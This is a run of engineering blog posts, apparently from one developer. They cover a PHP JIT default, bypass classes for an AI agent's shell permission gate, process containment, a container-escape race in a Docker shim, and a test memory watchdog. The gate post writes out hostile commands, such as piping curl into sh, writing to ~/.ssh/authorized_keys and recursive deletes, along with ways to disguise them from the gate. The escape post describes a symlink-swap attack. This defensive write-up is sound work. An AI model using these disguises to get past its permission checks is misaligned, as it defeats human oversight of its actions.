Bump the pins to 8.4.26 and 8.5.11 or later. Re-run both bisect fixtures on the new SDKs with opcache_jit = "tracing" forced on. That’s the Windows Laravel skeleton and the Linux uncached-parent route. Only then reconsider the single-site default, and only there. The multi-tenant reason for keeping it off (buffer that never comes back) has nothing to do with this bug. The broader lesson for me is about which default to pick when the upside is a benchmark and the downside is a crash with no log line. The JIT made a synthetic loop 2.4x faster. It did roughly nothing for a real Laravel app. And it had a known-unknown failure mode that our own risk section called out. A default like that should be something you opt in to, at least until the upstream bug class has been quiet for a while.
Links ephpm#350 - shaped JIT default (on in single-site serve) ephpm#365 / ephpm#372 - stock Laravel dies after 3 requests; JIT default off everywhere php-src#21368 - the change that introduced the regression php-src#21710 - root cause, reproducers and the fix discussion php-src commit 7873640 - “JIT: persist the SHM op_array in trace exit_info” ePHPm benchmarking findings - the JIT that made cpu.php 17% slower

title: Your Agent's Shell Allowlist Is Bypassable
description: A permission gate for AI agents' shell commands judged spellings instead of commands. I found several classes of bypass in shipmates' own gate, and one idea fixes most of them.
body:
Every shipmates crew member runs shell commands. Before any of them runs, it goes through a permission gate. The gate uses the same rule syntax as Claude Code settings: Bash(git status), Bash(rm *), Write(**/.claude/settings.json). The rules are merged from several layers:
a fleet-wide deny list pushed from Fleet Command per-persona policy files project settings the Brig, which compiles shipmates’ fifteen “Ship’s Articles” into deny and ask rules Deny beats ask, ask beats allow.
That sounds solid until you remember the rule is matched against a string. The agent chooses the string. Between mid-August and mid-September I closed a long list of ways to say the same command so the gate didn’t recognize it. Some came out of a pre-release security review of shipmates (#34, #37, #42). Others came from an adversarial review of the fix for the previous batch. This post is about the classes. If you’re building a gate like this, they will apply to yours. Everything here is about shipmates’ own evaluator. All of it is fixed, and the examples use a placeholder URL.
The one idea Every bypass below is the same mistake: the gate judged a spelling, not the command. A rule that names a command has to be matched against every command the line will run. That means every spelling the shell will accept. When the gate can’t see what will run, it has to fail closed to “ask”.
Class 1: trusting the first word The gate has a list of read-only builtins (ls, cat, git status, grep…) that are allowed without a prompt. That way crews aren’t asking permission to read files all day. The check looked at the first token and nothing else. The compound splitter also didn’t treat a newline as a separator. So:
command head token what actually runs cat notes > ~/.ssh/authorized_keys cat a file write echo ok⏎curl … -o ~/.bashrc echo a download over your shell profile echo $(curl … | sh) echo arbitrary execution env sh -c '…' env arbitrary execution find . -exec sh -c '…' \; find arbitrary execution PR #36 did three things:
SplitCompound splits on \n (while treating backslash-newline as the continuation it is). The auto-allow requires a genuinely simple command. A quote-aware hasShellControl scan rejects unquoted redirection, $(…), backticks, process substitution and leftover chaining. An unbalanced quote counts as control, because we can’t read the line the way the shell will. env and find came off the read-only list for good, with a comment saying why. Both run a program named in their own arguments. Quoted metacharacters are still just arguments. grep 'a|b' file and echo "a > b" still auto-allow. There are tests asserting that, because a gate that prompts on everything gets turned off.
Class 2: command lines hidden inside command lines Not getting an auto-allow isn’t the same as being judged. An operator allow rule like Bash(echo *) still matched echo $(curl … | sh) as a whole. The sh at the end of the pipe never met a rule. The same went for eval '…', sh -c '…', bash <<< '…' and pwsh -Command …. Then there’s pwsh -EncodedCommand <base64>, a blob no glob can read at all.
The fix (PR #43, d7b7262, PR #55) was to extract every nested command line. Each one is judged exactly like a top-level one:
func NestedCommandLines(sub string) []string { out := SubstitutionBodies(sub) out = append(out, shellScriptArgs(sub)...) out = append(out, hereStringArgs(sub)...) out = append(out, powerShellCommandArgs(sub)...) return append(out, evalArgs(sub)...) } and recurse, so the compound is allowed only if everything it will run is allowed:
for _, nested := range NestedCommandLines(sub) { nd := evaluateBashLine(tool, nested, rules, depth+1) if nd.Effect == EffectDeny { return Decision{Effect: EffectDeny, Reason: nd.Reason} } if nd.Effect == EffectAsk && worst == EffectAllow { worst = EffectAsk } } Each level is strictly shorter than its parent, so the walk ends on its own. maxNestedShellDepth = 8 is insurance.
A few details that mattered:
sh -c is not blanket-denied. Shell one-liners are ordinary work. Denying them would make the “no piped execution” Article mean “no shell scripting”. Instead the script gets split, and the inner bare sh lands on the existing deny. Here-strings are only treated as scripts when the head is a shell interpreter. <<< fed to grep is data. PowerShell resolves parameters by any unambiguous prefix. So -Command arrives as -c, -com…, and -EncodedCommand as -e, -enc, plus the documented -ec. It also accepts -Command:'…'. And an unquoted -Command takes the rest of the line as the script, not just the next token. An adversarial review of PR #55 found the colon form and the rest-of-line form both getting past my first version. -EncodedCommand is base64 of UTF-16LE. If it decodes, judge the script. If it doesn’t, hand back the raw blob. That matches no allow rule and no read-only builtin. It falls through to ask instead of riding in on the pwsh head token. Class 3: respelling the program Against a plain Bash(rm *) deny, all of these used to be an ask (or an allow, with a broad allow rule in force):
\rm command rm and command -p rm exec rm and exec -a ls rm /bin/rm FOO=bar rm timeout 5s rm (5s wasn’t recognized as the duration argument, so the “command” became 5s) On Windows, a backslash path to powershell.exe didn’t reduce to powershell. None of the PowerShell extraction even ran.
normalizeHeadToken resolves those to the program that will run. The important design choice is that the normalized form is an additional match candidate, never a replacement. It’s also only used for deny and ask. sudo and doas fold too, but only for deny and ask. Folding them for allow would let a rule written for the unprivileged spelling approve a privileged run. Widening what earns a silent allow is the one direction worth being stingy in. The cost of leaving /bin/ls off the read-only list is a prompt.
Class 4: respelling the path Path rules have the same problem with a different alphabet:
.. segments: .claude/foo/../settings.json against Write(**/.claude/settings.json). Paths are now lexically cleaned. Relative paths are resolved against the project root so ../../../etc/cron.d/x lands on an absolute rule. Case on Windows. NTFS folds case but the glob compared bytes. So c:\windows\… missed C:/Windows/**. Matching now lower-cases both sides when the path is volume-rooted. It leaves Unix paths case-sensitive (/etc and /ETC are different files there). UNC paths. The fold only fired for drive letters. So \\srv\share\repo\.CLAUDE\settings.json on a network-share checkout dodged the rule (PR #59). The fun part of that one is that path.Clean collapses the leading // to /. That erases the very signal the fold keys on. The cleaner has to notice and put it back. Separator handling is deliberately asymmetric. A backslash is a separator only where it is one. So .claude\foo\..\settings.json cleans on Windows and stays one strange filename on Linux. Watching it close To write this up I put a small probe test into a throwaway worktree. I ran it against five points in shipmates’ history. The rules are:
allowed: Bash(echo *), Bash(bash *) and Bash(pwsh *) denied: Bash(sh), Bash(rm *) and Bash(Remove-Item *) denied for the path rows: Write(**/.claude/settings.json) The first row uses no rules at all, to show the read-only auto-allow on its own.
command Aug 15, before after #36 after #43 after #55 after #59 cat notes > ~/.ssh/authorized_keys (no rules) allow ask ask ask ask echo $(curl … | sh) allow allow deny deny deny eval 'curl … | sh' ask ask deny deny deny \rm -rf build ask ask deny deny deny timeout 5s rm -rf build ask deny deny deny deny bash <<< 'curl … | sh' allow allow allow deny deny pwsh -Command Remove-Item -Recurse C:/src allow allow allow deny deny pwsh -EncodedCommand <same, encoded> allow allow allow deny deny pwsh -EncodedCommand not-base64!! allow allow allow ask ask Write .claude/foo/../settings.json allow allow deny deny deny Write C:\repo\.CLAUDE\settings.json allow allow allow deny deny Write \\srv\share\repo\.CLAUDE\settings.json allow allow allow allow deny “Ask” rows in the first columns aren’t safe either. An ask means a human sees eval '…' in an approval prompt at the end of a long day. They have to read it correctly. The point of a deny rule is that nobody has to.
The discipline Every bypass got a test that fails first. Not “I wrote a test and it passes”. The loop was:
write the case and watch it fail against main fix it and watch it pass for the review-driven ones, revert the fix in place and confirm the test goes red again The four Windows bypasses in 96049fc were found after the first version of PR #55 had green tests. That’s the whole argument for having someone (or something) attack your fix specifically.
Equally important are the negative tests. ls, cat foo, git status, grep 'a|b' file and pwsh -Command 'Get-ChildItem' all have to stay quiet. Otherwise the gate just becomes the thing people disable.
What’s still open Cross-interpreter nesting. A nested command line is judged under the outer tool’s name. A PowerShell payload sent through the Bash tool is matched against Bash(…) rules. A PowerShell(iex …) deny wouldn’t fire. shipmates dispatches pwsh through the PowerShell tool on Windows. The commit that documents it notes it degrades to ask rather than allow. The right fix is to key nested evaluation off the interpreter. Things the gate can’t see. sh script.sh, pwsh -File x.ps1, < file, and arguments that xargs reads from stdin all point at content that isn’t in the command string. These are documented blind spots. xargs stays a wrapper on purpose. Stripping it means … | xargs rm -rf gets judged as rm -rf. Bypass mode. A persona running with bypassPermissions skips the ship-side layers by design. The question I had to answer early was whether that should also skip the Admiral’s fleet-wide deny list. It doesn’t. Article 14 makes the fleet deny bind bypass-mode personas. The Brig’s freeze still blocks Write-class tools even in bypass mode. A shell allowlist matched against strings will never be a sandbox. It’s a seatbelt. It keeps an agent from doing the obvious dangerous thing because it got confused or because a hostile issue body told it to. The walls are containment (see Job Objects vs process groups) and running the ship as an unprivileged user. But a seatbelt that comes undone when you spell rm with a backslash isn’t doing its job either.
How I measured The table comes from a probe test. It uses NewEvaluatorWithRules plus the package’s own rules() and bashInput() test helpers. I copied it into a detached git worktree of shipmates and ran it with go test -v -run TestBlogProbe ./internal/permissions/ at five commits:
970a958^1 (main just before #36) 970a958 (#36 merged) 14e01ef (#43) c1c4a25 (#55) 977ad4c (main after #59) It ran on Go 1.26 on Windows 11, so the drive-letter and UNC rows reflect Windows path handling. The worktree was removed afterward. The curl URL in the probe is https://example.invalid/x.sh.
Links PR #36: read-only builtin auto-allow bypass PR #43: substitution bodies, head-token respelling, path normalization PR #55: here-strings, PowerShell -Command/-EncodedCommand, Windows Brig parity PR #59: case-folding UNC paths docs/brig.md and docs/security.md about_PowerShell_exe: -EncodedCommand

title: Cross-Platform Process Containment: Job Objects vs Process Groups vs cgroups
description: How shipmates bounds and tears down agent process trees on Windows, Linux and macOS. It also covers why I deleted 1,206 lines of cgroup code and the grandchild that escaped the memory cap everywhere except my dev box.
body:
Every turn a shipmates crew member takes is a subprocess. It’s claude or the codex app-server. That in turn spawns shells, go test, npm or whatever the task calls for. Two things have to be true about that tree. When a turn ends or gets killed, the whole tree goes, including the grandchildren. And if somebody sets a memory or CPU budget, the budget applies to the whole tree, not just the process I happened to start.
Each OS gives you a different primitive for that, and they’re not equivalent. shipmates ended up using Job Objects on Windows and process groups plus sampling on Linux and macOS. This post covers how that happened and why the cgroup path got deleted. It also covers the bug that only existed on the platforms I wasn’t sitting in front of.
The three primitives Windows Job Object Unix process group Linux cgroup v2 Who’s in it every descendant, automatically, unless it breaks away every descendant that doesn’t call setpgid/setsid every descendant, can’t leave without privileges Tree kill TerminateJobObject, or KILL_ON_JOB_CLOSE when the last handle closes kill(-pgid, SIGKILL) cgroup.kill (5.14+) Memory cap kernel-enforced, JobMemoryLimit on committed memory none, you sample and kill kernel-enforced, memory.max Process count cap kernel-enforced, ActiveProcessLimit none pids.max Privileges none none a delegated subtree (systemd scope, or root) On paper cgroups win. In practice, “a delegated subtree” is where it falls apart for a tool you install with a single binary:
on a desktop you need a systemd user scope with the right controllers delegated in a container you usually don’t get one at all macOS doesn’t have cgroups Job Objects need nothing. Process groups need nothing.
Deleting the cgroup launcher The codex runtime originally carried its own Linux-only, cgroup-delegating launcher inside internal/codexapp. It was reachable only through the codex transport, and only when an operator set containment.mode: cgroup. Its single real test was gated behind SHIPMATES_REAL_CONTAINMENT_TEST=1. Which meant it had never run in CI. When I moved CI to ephemerd I even wrote down that the delegated-scope job was the gap. Everywhere else, and by default, codex ran with no containment at all.
24bd788 deleted it. That’s 1,206 lines across these files:
containment_linux.go cgroup_discovery_linux.go their tests containment_pidfd_linux.go containment_other.go Codex now spawns its app-server through the same containment.Watcher that Claude uses. Every runtime gets the same bounds on every OS.
The part I care most about is what happens to configs that still say cgroup. The old docs said it “degrades to watchdog with a warning”. Now the config fails to resolve, with config.ErrCgroupModeRemoved:
containment mode "cgroup" has been removed: shipmates now contains every runtime with the portable watchdog (RSS/CPU sampling plus process-tree teardown on Linux, macOS and Windows). Use mode: watchdog — your memory_limit_mb, cpu_limit_seconds and other limits carry over unchanged An operator who asked for kernel enforcement and quietly got polling has been told something untrue about their own deployment. A warning in a log nobody reads is still a lie. The same reasoning applies to Caps.Containment. It’s now derived from whether the supervisor bounds anything, so the none watcher can’t report that it contains.
Windows: suspended, assigned, resumed On Windows the watchdog creates the child suspended. It puts the child in a Job Object before it runs a single instruction, then resumes it. Assigning a running process leaves a window where it can spawn a child outside the job.
func prepare(cmd *exec.Cmd, _ containment.Limits) error { if cmd.SysProcAttr == nil { cmd.SysProcAttr = &syscall.SysProcAttr{} } cmd.SysProcAttr.CreationFlags |= windows.CREATE_SUSPENDED | windows.CREATE_NEW_PROCESS_GROUP return nil } Then attach creates the job with JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE and layers on whatever limits were asked for:
info := windows.JOBOBJECT_EXTENDED_LIMIT_INFORMATION{ BasicLimitInformation: windows.JOBOBJECT_BASIC_LIMIT_INFORMATION{ LimitFlags: windows.JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE, }, } if limits.MaxRSSBytes > 0 { info.BasicLimitInformation.LimitFlags |= windows.JOB_OBJECT_LIMIT_JOB_MEMORY info.JobMemoryLimit = uintptr(limits.MaxRSSBytes) } if limits.MaxProcesses > 0 { info.BasicLimitInformation.LimitFlags |= windows.JOB_OBJECT_LIMIT_ACTIVE_PROCESS info.BasicLimitInformation.ActiveProcessLimit = limits.MaxProcesses } Each flag is guarded on a non-zero limit. Setting a LimitFlags bit without its paired value is a no-op at best. And a caller who asked for nothing shouldn’t silently get kernel enforcement. KILL_ON_JOB_CLOSE is always on. Even if shipmates itself dies, closing the last job handle takes the tree with it. That’s the closest thing Windows has to Linux’s Pdeathsig.
JobMemoryLimit is committed memory across every process in the job. The kernel enforces it when the allocation happens. To see it, I put a Go “agent” in a job with a 256 MiB limit. It spawned a “tool” grandchild that commits 16 MiB at a time:
parent: agent in a job with a 256 MiB limit tool: 16 MiB committed tool: 32 MiB committed ... tool: 208 MiB committed tool: 224 MiB committed runtime: VirtualAlloc of 16777216 bytes failed with errno=1455 fatal error: out of memory Errno 1455 is ERROR_COMMITMENT_LIMIT. My code never touched the grandchild. It just inherited the job, and the kernel stopped it short of the budget the parent was given. The agent and the Go runtime overhead eat the rest. No polling gap.
Linux and macOS: process groups and a sampler On Unix the child is started as a process group leader with Setpgid. Its pid is the pgid and every descendant inherits the group. Teardown signals the group:
func killTree(cmd *exec.Cmd, kill bool) error { if cmd.Process == nil { return nil } sig := syscall.SIGTERM if kill { sig = syscall.SIGKILL } pgid, err := syscall.Getpgid(cmd.Process.Pid) if err != nil { pgid = cmd.Process.Pid } return syscall.Kill(-pgid, sig) } There’s no kernel memory cap here. A sampler polls RSS and CPU time on an interval and calls killTree when the budget is exceeded. Which brings us to the bug.
The bug my dev box hid A cross-platform sweep after v0.6.0 found it (PR #58). The Unix sampler measured RSS and CPU for cmd.Process.Pid, the root, and nothing else. The kill covered the whole process group. So the scope of measurement and the scope of enforcement didn’t match. A tool subprocess that hogged memory or spun CPU was invisible to the sampler, and the cap never fired.
On Windows the Job Object enforces memory across the whole tree in the kernel, so the bug simply doesn’t exist there. I develop shipmates on Windows. Every manual check I’d ever done of the memory cap passed.
Here’s a small Linux program showing exactly what the old sampler saw. The “agent” is a tiny Go process that runs a “tool” child which touches 512 MiB:
t=0.5s root pid RSS: 2.7 MiB process group RSS: 519.2 MiB (2 procs) t=1.0s root pid RSS: 2.7 MiB process group RSS: 519.2 MiB (2 procs) t=1.5s root pid RSS: 2.7 MiB process group RSS: 519.2 MiB (2 procs) t=2.0s root pid RSS: 2.7 MiB process group RSS: 519.2 MiB (2 procs) With a 256 MB cap, the old sampler would read 2.7 MiB forever.
The fix (1642864) makes the Unix samplers measure the group. On Linux that’s a walk of /proc. It reads field 5 of each /proc/<pid>/stat (the pgrp) and sums statm RSS and utime+stime for the members. Field parsing has to count from the last ). The comm field is parenthesized and can itself contain spaces and parentheses:
func parseProcStatPgrp(s string) (int, error) { closeIdx := strings.LastIndex(s, ")") if closeIdx < 0 { return 0, fmt.Errorf("watchdog: malformed stat: %q", s) } after := strings.Fields(s[closeIdx+1:]) if len(after) < 3 { return 0, fmt.Errorf("watchdog: stat missing pgrp field") } pgrp, err := strconv.Atoi(after[2]) // state ppid pgrp ... if err != nil { return 0, fmt.Errorf("watchdog: bad pgrp: %w", err) } return pgrp, nil } macOS has no /proc, and ps has no dependable “select by process group” flag. So it snapshots every process with ps -Ao pgid=,rss= (and pgid=,time= for CPU) and sums the rows whose pgid matches. Both versions treat “no processes found in the group” as a failed sample, not a zero. A gone group leader skips the tick rather than reporting a reading comfortably below the cap.
The summation logic is factored into pure functions so it’s unit tested on every platform. There’s also a linux || darwin test that spawns a memory-hogging grandchild and fails against the old root-only sampler.
What’s still uneven The Windows sampler is still root-only, on purpose. Memory is enforced tree-wide by the job, so the sampler there is defense in depth. CPU seconds are the exception. The Job Object doesn’t express a CPU-seconds budget the way the watchdog does. So cpu_limit_seconds on Windows is approximated from the root process’s times. A grandchild spinning CPU on Windows escapes that cap today. The cheap fix is probably QueryInformationJobObject with JobObjectBasicAccountingInformation. It reports total user and kernel time for everything that has ever run in the job, with no tree walk required. That’s next.
And sampling is sampling. A process group can grow between two polls. Anything that calls setsid leaves the group entirely. For an agent’s tool calls that’s an acceptable trade for a single binary that needs no privileges. If you need a hard wall on Linux, run the ship inside a systemd scope or a container with memory.max set. Let shipmates’ own limits be the inner layer.
How I measured Both demos are small standalone Go programs on an AMD Ryzen 9 5950X with 128 GB RAM. I used Go 1.26.5 on Windows 11 Pro. The Linux one was cross-compiled and run under WSL2 kernel 6.18.33.2. It starts an “agent” with Setpgid: true. The agent runs a “tool” that allocates 32 x 16 MiB with every page touched. Every 500 ms it prints /proc/<pid>/statm RSS for the root next to the sum over the process group. The Windows one creates a Job Object with JOB_OBJECT_LIMIT_JOB_MEMORY set to 256 MiB and assigns the agent. Then it lets the agent’s child allocate 16 MiB at a time.
Links 24bd788: contain codex with the portable watchdog, delete cgroups shipmates PR #58: sample the whole process group Job Objects (Microsoft Learn) JOBOBJECT_BASIC_ACCOUNTING_INFORMATION cgroup v2 documentation

title: Bind Mounts Across Mount Namespaces: Four PRs and a Container Escape
description: Making GitHub Actions container: jobs work through ephemerd's Docker API shim took four tries, then a TOCTOU race turned the working version into an escape.
body:
GitHub Actions has a container: key that runs a job’s steps inside an image of your choosing. It’s popular because it gives you a reproducible toolchain without building a custom runner image. On a self-hosted runner it works by having the runner drive Docker. On ephemerd, “Docker” is a shim that speaks the Docker API and creates containers in containerd. Getting bind mounts right through that shim took four PRs in a week. A couple of months later the version that worked turned out to be an escape.
What the runner asks for For a container: job the runner does a docker create of a sibling container with a long list of binds. Then it runs every step as docker exec sh -e /__w/_temp/<uuid>.sh:
-v /home/runner/_work:/__w -v /home/runner/_work/_temp:/__w/_temp -v /home/runner/_work/_actions:/__w/_actions -v /home/runner/externals:/__e:ro -v /var/run/docker.sock:/var/run/docker.sock ... Every one of those source paths is a path inside the runner’s container. The runner writes the step script into its own _temp and expects the sibling to see it at /__w/_temp. But the Docker API server is ephemerd, and it runs on the host in a different mount namespace. There /home/runner/_work doesn’t exist. Translating “a path in container A’s filesystem” into “something I can bind into container B” is the whole problem.
#82: binds were silently dropped The first version of the shim os.Stat’d each bind source on its own filesystem. It quietly skipped any that didn’t exist. None of them existed from the host’s point of view, so every bind was dropped. The sibling started fine, and the first step died with:
sh: 0: cannot open /__w/_temp/<uuid>.sh: No such file That’s confusing, because the script very much exists. #82 added a translation layer. The runtime registers the runner’s snapshot and its own bind table with the shim. The bind table holds docker.sock, /etc/hosts and the runner directory. Each -v source resolves against these, in order:
the bind table, by longest prefix the overlayfs upperdir (read-write) the lowerdirs (read-only, since image layers are shared between jobs) A source that matches none of them gets a 400 instead of a silent drop.
#83: the wrong layer That got the first script running. Then actions/checkout failed:
exec: "/__e/node20/bin/node": stat /__e/node20/bin/node: no such file or directory The resolver returned the first lowerdir that had the requested path. In the runner image, /home/runner/externals/ exists as a directory entry in one layer, but node20/bin/node lives in a later one. Binding the first match gave the sibling an empty tree. Overlay merging is the kernel’s job, and I was doing it badly by hand.
#83 let the kernel do it: use /proc/<runner-pid>/root/<src>. That magic link walks into the runner’s mount namespace and sees the merged overlay exactly as the runner does.
#84: mount(2) won’t cross namespaces That works perfectly for reading. It doesn’t work at all as a bind source:
error mounting "/proc/<pid>/root/home/runner/_work/_temp/_github_workflow" to rootfs ... MS_BIND|MS_REC: invalid argument A bind source has to resolve within the calling process’s mount namespace. /proc/<pid>/root resolves into somebody else’s. #84 switched to os.Readlink("/proc/<pid>/root") once at registration. That should return the host path of the bundle rootfs where runc mounted the merged overlay. That’s a normal directory in the host namespace, and it has every layer’s content.
#85: readlink says “/” Inside the Linux VM, that readlink returned /. Every time, before and after task.Start. I never fully traced why. The log line was enough:
runner rootfs registered ... rootfs_path=/ bind_table_entries=3 So every source resolved to itself on the VM’s root filesystem and got rejected. #85 stopped asking procfs. It built the path from containerd’s own state layout instead. ephemerd embeds containerd, so it fully controls that layout:
runnerRootfsPath := filepath.Join(r.cfg.DataDir, "containerd", "state", "io.containerd.runtime.v2.task", namespace, id, "rootfs") That’s where the runc shim mounts the merged overlay, every time. A probe workflow wrote a script into _temp from the runner. It ran the script from a sibling via docker run -v and got HELLO_FROM_SIBLING back. container: jobs worked.
The escape Here was the design at that point:
take the job’s source path and join it to the runner’s rootfs path os.Stat it and check that it’s still inside the rootfs put the resulting path string into the sibling’s OCI spec Then runc walks that string again to do the mount. It does that in its own process, some milliseconds later.
The job owns every byte of the runner’s rootfs. So between ephemerd’s check and runc’s walk, the job can rename the validated directory and drop a symlink in its place. runc follows the symlink and mounts whatever it points at. That’s issue #125. #173 reproduced it against real runc 1.3.4, the same version ephemerd embeds:
A path-string source (the code at the time) runc rc=0 CONTAINER-SAW: SWAPPED <- escape reproduced B /proc/<pid>/fd/N mount ... : invalid argument C staging bind runc rc=0 CONTAINER-SAW: PINNED Case B is worth a moment. The textbook TOCTOU fix is to resolve once and hold a file descriptor. Then you hand over the descriptor instead of the name. There was even a “hardening” branch that did exactly that, putting /proc/<pid>/fd/N in the spec. It fails for the same reason #84 did. runc runs in its own mount namespace, and the fd path doesn’t resolve there as a bind source. So every bind fails, legitimate ones included. That branch wasn’t a fix. It was a regression that nobody had run against a real runc. The test that proves this is kept in the repo on purpose (TestBindStaging_RealRunc_ProcFdSourceIsRejected).
The fix: pin it, then stage it Two steps, and both are needed.
Resolve once, to a descriptor, with the kernel enforcing containment. openat2(2) with RESOLVE_IN_ROOT treats the rootfs fd as / for the whole walk. So .. and absolute symlinks clamp inside it rather than escaping. The result is held as an O_PATH fd. Renaming things afterwards can’t change what the fd points at:
how := &unix.OpenHow{ Flags: unix.O_PATH | unix.O_CLOEXEC, Resolve: unix.RESOLVE_IN_ROOT | unix.RESOLVE_NO_MAGICLINKS, } fd, err := unix.Openat2(rootFd, strings.Join(comps, "/"), how) I used openat2 rather than Go’s os.Root on purpose. os.Root rejects absolute symlinks outright. Merged-usr images (/bin -> /usr/bin) are full of them, so it would break every Ubuntu runner image. RESOLVE_IN_ROOT reinterprets them relative to the root. That’s what a symlink inside a container rootfs means. Kernels older than 5.6 get an O_PATH|O_NOFOLLOW component-by-component walk instead. A test asserts both resolvers land on the same inode.
Stage it, because a descriptor can’t go in the spec. ephemerd does the bind itself onto a directory it owns. It does that in its own mount namespace, where /proc/self/fd/N does resolve. The spec gets the staging path:
target := filepath.Join(m.dir, strconv.FormatUint(m.seq, 10)) // ... create a dir or empty file to match the source type ... // /proc/self/fd/<n> is resolvable here because this IS the process that // opened it and this IS its mount namespace — the two conditions runc // cannot satisfy. src := "/proc/self/fd/" + strconv.Itoa(p.fd) if err := unix.Mount(src, target, "", unix.MS_BIND|unix.MS_REC, ""); err != nil { _ = os.Remove(target) return "", fmt.Errorf("staging bind source %s at %s: %w ...", p.logical, target, err) } runc still walks a path, but now it’s <data>/dind-binds/<job>/<n>. The leaf is a bare counter. Nothing from the request ends up in the name. Every directory above it has to be root-owned and not group- or world-writable. ensureTrustedAncestry checks that rather than assuming it. There’s nothing left for the job to swap.
The validation is the part I’d point other people at. The privileged tests run real runc against real containerd in a root shell. The swap test contains its own control. It runs the old path-string code in the same test and asserts it does see SWAPPED. Without the control, a green run proves nothing. That’s precisely how the fd branch got through review.
Deleting through a live bind mount One detail in #173 deserves its own heading. The obvious place for the staging dir was under the job’s directory, <data>/jobs/<job-id>/. But the runtime’s orphan sweep os.RemoveAlls that tree. Recursively deleting a directory that contains a live bind mount deletes the files you see through the mount. Here that’s the runner’s own rootfs. So three things changed:
Staging lives at <data>/dind-binds/. The teardown refuses to remove a directory that still has mounts under it. The startup sweep unmounts staged binds before sweeping containers and snapshots. A leaked staging mount also pins the rootfs, so the snapshot can’t be removed. Pins are held for the container’s whole life, not just until the task starts. docker restart makes runc read the spec again.
#201: sweeping someone else’s staging dir That startup sweep came back to bite me. A later change added a periodic reaper for dead job containers. It called the whole-tree SweepStagedBinds on every pass. That function’s own doc comment said “startup only”, for exactly this reason: it doesn’t know which jobs are live.
The symptom was jobs running several docker run -v "$PWD":/w steps failing partway through:
docker: Error response from daemon: bind mount /home/runner/_work/ephpm/ephpm -> /w rejected: creating bind staging mountpoint /var/lib/ephemerd/dind-binds/ephemerd-github-ephpm-sure_hopper/2: mkdir /var/lib/ephemerd/dind-binds/... : no such file or directory The /2 was the tell. Binds 0 and 1 staged fine. Then a reaper tick for some unrelated dead container wiped every job’s staging directory, including this one. Already-running containers didn’t notice, since their mounts live in their own namespaces. But the next docker run -v couldn’t create its mountpoint. #201 scopes the periodic sweep to the container actually being reaped. The test asserts the live job’s directory survives.
What I’d tell myself in May Paths are names, and names can change between when you check and when somebody else uses them. If a job controls any component of a path, that path can’t cross a process boundary as a string. Mount namespaces are the constraint for every one of these bugs. /proc/<pid>/root, /proc/<pid>/fd/N and a readlink that says / are all the same lesson about which namespace a path resolves in. Security fixes need a test that fails on the unfixed code, run against the real thing. Mocks of runc don’t have mount namespaces. Links PRs: #82, #83, #84, #85, #173, #201 docs/arch/dind-bind-translation.md openat2(2)

title: A 1 TB Test: Building a Memory Watchdog for go test
description: A runaway test binary hit about 1 TB of commit charge and took my desktop down. Here's the PowerShell and POSIX sh wrapper I put around go test, and the bug in it that the Windows box couldn't show me.
body:
On August 16th a server.test.exe from shipmates climbed to roughly 1 TB of commit charge on my Windows workstation. Windows Terminal was hosting several agent sessions in tabs. It hard-faulted with E_OUTOFMEMORY, and every one of those sessions died at the same moment. It wasn’t the first time either. An earlier one hit about 236 GB through an infinite filepath.Dir loop.
The machine has 128 GB of RAM. Commit charge doesn’t care. It’s backed by the page file, and Windows will happily let a process reserve-and-commit until the commit limit is gone. Then everything else on the desktop starts failing allocations too.
I wanted the worst case to be a killed test process instead of a dead desktop.
Watch the children, not go go test ./... builds one test binary per package and runs it as a child: server.test.exe, permissions.test.exe and so on. A test that allocates without bound blows up in that child. The parent go process stays small the entire time. So anything that watches go misses it. That includes a job limit on the shell, a ulimit on the parent’s RSS, or eyeballing Task Manager for go.exe.
So PR #54 added two scripts with the same contract. scripts/safe-test.ps1 is for Windows and scripts/safe-test.sh is for Linux, macOS and CI:
Start go test -count=1 <target> with output captured to a temp file outside the repo. Every 0.5 s, walk the process tree from that go pid down and pick out the *.test binaries. A sibling go test running for another agent is left alone, which matters on a box running four or five crews. Record a per-package peak. If a child crosses the cap (default 2000 MB), kill it and the whole go tree. Print which package tripped and the tail of its output, then exit 1. The Windows tree walk is a Win32_Process snapshot and a stack:
function Get-Descendants($snapshot, [int]$root) { $desc = [System.Collections.Generic.HashSet[int]]::new() $stack = [System.Collections.Generic.Stack[int]]::new() $stack.Push($root) while ($stack.Count -gt 0) { $cur = $stack.Pop() if ($snapshot.ChildrenOf.ContainsKey($cur)) { foreach ($c in $snapshot.ChildrenOf[$cur]) { if ($desc.Add($c)) { $stack.Push($c) } } } } return $desc } Commit charge on Windows, RSS everywhere else The two scripts deliberately measure different things.
On Windows the runaway was commit charge. Working set is the physical RAM actually in use. It could stay small while commit ran to a terabyte, because the pages were committed but mostly never touched. So the PowerShell side reads PagedMemorySize64, which is the process’s page-file-backed committed memory:
# PagedMemorySize64 is the process's committed (page-file-backed) # memory -- the commit charge, which is what the OOM was about. Working # set (physical RAM) would have stayed small while commit ran to a TB. $commit = [int64]$gp.PagedMemorySize64 $pkg = $proc.Name -replace '\.test\.exe$', '' On Linux the equivalent number is useless. Every Go process reserves a big chunk of virtual address space up front, and Linux overcommits by default. So VSZ is large and harmless. What takes a Linux box down is resident memory, so the sh script reads RSS from ps.
Validating it the right way The 1 TB test itself is the more interesting part of the story. It was a test of a bounded behavior, the ring-buffer or event-log-cap kind. To prove the cap mattered, it exercised the “fails without the guard” case by disabling the bound and running unbounded. That turns a bounded test into an unbounded allocator. The rule that went into CONTRIBUTING.md:
When you test that a limit holds, do not verify the “fails without the guard” case by disabling the bound and running unbounded. Assert against an injected small cap instead (fill a 4-slot buffer, prove the 5th is dropped), or run under the watchdog with a low cap.
The watchdog got the same treatment. You don’t prove a kill switch works by letting something run away and hoping. The PR validated it against a throwaway allocator with -CapMB 300. A healthy ./internal/server/... run peaked at 104.3 MB and passed. The allocator tripped the kill at 300.2 MB and exited 1.
I reran the same idea for this post with a test that grows by 16 MiB every 50 ms. It touches every page so it shows up in RSS too. It stops itself at 1.5 GiB, so a watchdog that misses it can’t hurt anything:
func TestRunaway(t *testing.T) { var keep [][]byte for i := 0; i < 96; i++ { b := make([]byte, 16<<20) for j := 0; j < len(b); j += 4096 { b[j] = 1 } keep = append(keep, b) time.Sleep(50 * time.Millisecond) } runtime.KeepAlive(keep) } On Windows:
